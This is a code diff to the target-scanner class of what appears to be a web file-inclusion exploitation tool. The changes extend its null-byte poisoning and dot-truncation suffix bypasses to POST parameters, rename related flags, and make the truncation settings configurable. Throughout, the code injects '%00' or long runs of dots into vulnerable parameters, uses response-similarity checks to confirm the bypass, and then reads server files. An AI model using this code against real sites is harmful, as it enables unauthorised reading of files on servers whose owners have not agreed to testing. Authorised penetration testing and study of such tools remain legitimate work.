@@ -36,7 +36,7 @@ class targetScanner (baseClass.baseClass):
 
     def _load(self):
         self.MonkeyTechnique = False
-        self._log("TargetScanner loaded.", self.LOG_DEBUG)
+        self._log("TargetScanner loaded.", self.LOG_DEVEL)
         self.params = {}
         self.postparams = {}
 
@@ -363,60 +363,85 @@ class targetScanner (baseClass.baseClass):
                 if (sur != ""):
                     self._log("Trying NULL-Byte Poisoning to get rid of the suffix...", self.LOG_INFO)
                     tmpurl = URL
-                    tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
-                    code = self.doGetRequest(tmpurl)
+                    PostHax = PostData
+                    
+                    if (not isPost):
+                        tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
+                    else:
+                        PostHax = PostData.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
+                        
+                    code = self.doPostRequest(tmpurl, PostHax)
                     if (code == None):
                         self._log("NULL-Byte testing failed.", self.LOG_WARN)
-                        r.setNullBytePossible(False)
+                        r.setSuffixBreakable(False)
                     elif (code.find("%s\\0%s"%(rndStr, sur)) != -1 or code.find("%s%s"%(rndStr, sur)) != -1):
                         self._log("NULL-Byte Poisoning not possible.", self.LOG_INFO)
-                        r.setNullBytePossible(False)
+                        r.setSuffixBreakable(False)
                     else:
                         self._log("NULL-Byte Poisoning successfull!", self.LOG_INFO)
                         r.setSurfix("%00")
-                        r.setNullBytePossible(True)
+                        r.setSuffixBreakable(True)
+                        r.setSuffixBreakTechName("Null-Byte")
 
-                if (not r.NullbytePoison and self.config["p_doDotTruncation"]):
-                    self._log("Trying Dot Truncation to get rid of the suffix...", self.LOG_INFO)
-                    dot_trunc_start = 700
-                    dot_trunc_end   = 800
-                    dot_trunc_step  = 50
-                    max_diff        = 0.095
-
-                    self._log("Preparing Dot Truncation comparation string...", self.LOG_DEBUG)
-                    tmpurl = URL
-                    
-                    code1 = self.doGetRequest(URL)
-   
-                    vulnParamBlock = "%s=%s%s"%(VulnParam, Params[VulnParam], r.getAppendix())
-                    desturl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), vulnParamBlock)
-                    self._log("Test URL will be: " + desturl, self.LOG_DEVEL)
-                    
-                    success = False
-                    
-                    seqmatcher = difflib.SequenceMatcher()
-                    
-                    for i in range (dot_trunc_start, dot_trunc_end, dot_trunc_step):
-                        tmpurl = desturl
-                        desturl = desturl.replace(vulnParamBlock, "%s%s"%(vulnParamBlock, "." * i))
-                        content = self.doGetRequest(desturl)
-                        if (content == None):
-                            self._log("Dot Truncation testing failed :(", self.LOG_WARN)
-                            break
+                if (sur != "" and not r.isSuffixBreakable() and self.config["p_doDotTruncation"]):
+                    if (r.isUnix and self.config["p_dot_trunc_only_win"]):
+                        self._log("Not trying dot-truncation because it's a unix server and you have not enabled it.", self.LOG_INFO)
+                    else:
+                        self._log("Trying Dot Truncation to get rid of the suffix...", self.LOG_INFO)
+                        dot_trunc_start = self.config["p_dot_trunc_min"] 
+                        dot_trunc_end   = self.config["p_dot_trunc_max"]
+                        dot_trunc_step  = self.config["p_dot_trunc_step"]
+                        max_diff        = self.config["p_dot_trunc_ratio"]
+    
+                        self._log("Preparing Dot Truncation...", self.LOG_DEBUG)
+                        self._log("Start: %d"%(dot_trunc_start), self.LOG_DEVEL)
+                        self._log("Stop : %d"%(dot_trunc_end), self.LOG_DEVEL)
+                        self._log("Step : %d"%(dot_trunc_step), self.LOG_DEVEL)
+                        self._log("Ratio: %f"%(max_diff), self.LOG_DEVEL)
+                        desturl = URL
+                        PostHax = PostData
+                                         
+                        code1 = self.doPostRequest(URL, PostData)
+       
+                        vulnParamBlock = "%s=%s%s"%(VulnParam, Params[VulnParam], r.getAppendix())
                         
-                        seqmatcher.set_seqs(code1, content)
-                        ratio = seqmatcher.ratio()
-                        if (1-max_diff <= ratio <= 1):
-                            self._log("Dot Truncation successfull with: %d dots ; %f ratio)!" %(i, ratio), self.LOG_INFO)
-                            r.setSurfix("." * i)
-                            r.setNullBytePossible(True)
-                            success = True
-                            break
+                        if (not isPost):
+                            desturl = desturl.replace("%s=%s"%(VulnParam,Params[VulnParam]), vulnParamBlock)
                         else:
-                            self._log("No luck with (%s)..." %(i), self.LOG_DEBUG)
-                    if (not success):
-                        self._log("Dot Truncation not possible :(", self.LOG_INFO)
-
+                            PostHax = PostHax.replace("%s=%s"%(VulnParam,Params[VulnParam]), vulnParamBlock)
+                        
+                        self._log("Test URL will be: " + desturl, self.LOG_DEBUG)
+                        
+                        success = False
+                        
+                        seqmatcher = difflib.SequenceMatcher()
+                        
+                        for i in range (dot_trunc_start, dot_trunc_end, dot_trunc_step):
+                            tmpurl = desturl
+                            tmppost = PostHax
+                            if (not isPost):
+                                tmpurl = tmpurl.replace(vulnParamBlock, "%s%s"%(vulnParamBlock, "." * i))
+                            else:
+                                tmppost = tmppost.replace(vulnParamBlock, "%s%s"%(vulnParamBlock, "." * i))
+                            content = self.doPostRequest(tmpurl, tmppost)
+                            if (content == None):
+                                self._log("Dot Truncation testing failed :(", self.LOG_WARN)
+                                break
+                            
+                            seqmatcher.set_seqs(code1, content)
+                            ratio = seqmatcher.ratio()
+                            if (1-max_diff <= ratio <= 1):
+                                self._log("Dot Truncation successfull with: %d dots ; %f ratio!" %(i, ratio), self.LOG_INFO)
+                                r.setSurfix("." * i)
+                                r.setSuffixBreakable(True)
+                                r.setSuffixBreakTechName("Dot-Truncation")
+                                success = True
+                                break
+                            else:
+                                self._log("No luck with (%s)..." %(i), self.LOG_DEBUG)
+                        if (not success):
+                            self._log("Dot Truncation not possible :(", self.LOG_INFO)
+                        
             if (scriptpath == ""):
                 # Failed to get scriptpath with easy method :(
                 if (pre != ""):
@@ -441,7 +466,8 @@ class targetScanner (baseClass.baseClass):
             r.setBlindDiscovered(True)
             r.setSurfix("")
             if isNull: r.setSurfix("%00")
-            r.setNullBytePossible(isNull)
+            r.setSuffixBreakable(isNull)
+            r.setSuffixBreakTechName("Null-Byte")
             if (prefix.strip() == ""):
                 r.setServerPath("/noop")
             else:
@@ -519,7 +545,7 @@ class targetScanner (baseClass.baseClass):
                 post = post.replace("__QUIZ__", quiz)
                 p = p.replace("__ANSWER__", answer)
                 
-            if ((rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()))):
+            if ((rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()))):
                 if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                     if (self.readFile(rep, f, p, POST=post)):
                         ret.append(f)
@@ -544,7 +570,7 @@ class targetScanner (baseClass.baseClass):
                 quiz, answer = langClass.generateQuiz()
                 post = post.replace("__QUIZ__", quiz)
                 p = p.replace("__ANSWER__", answer)
-            if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()) or canbreak)):
+            if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()) or canbreak)):
                 if canbreak:
                     #SUPERDUPER URL HAX!
                     rep.setSurfix("&")
@@ -567,7 +593,7 @@ class targetScanner (baseClass.baseClass):
             f    = fileobj.getFilepath()
             type = fileobj.getFlags()
             
-            if ((rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()))):
+            if ((rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()))):
                 if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                     if (self.readFile(rep, f, p)):
                         ret.append(f)
@@ -616,8 +642,8 @@ class targetScanner (baseClass.baseClass):
                 type = fileobj.getFlags()
                 canbreak = fileobj.isBreakable()
                 
-                if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()) or canbreak)):
-                    if ((not rep.isNullbytePossible() and not rep.getSurfix() == "") and f.endswith(rep.getSurfix())):
+                if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()) or canbreak)):
+                    if ((not rep.isSuffixBreakable() and not rep.getSurfix() == "") and f.endswith(rep.getSurfix())):
                         f = f[:-len(rep.getSurfix())]
                         rep.setSurfix("")
                     elif (canbreak):
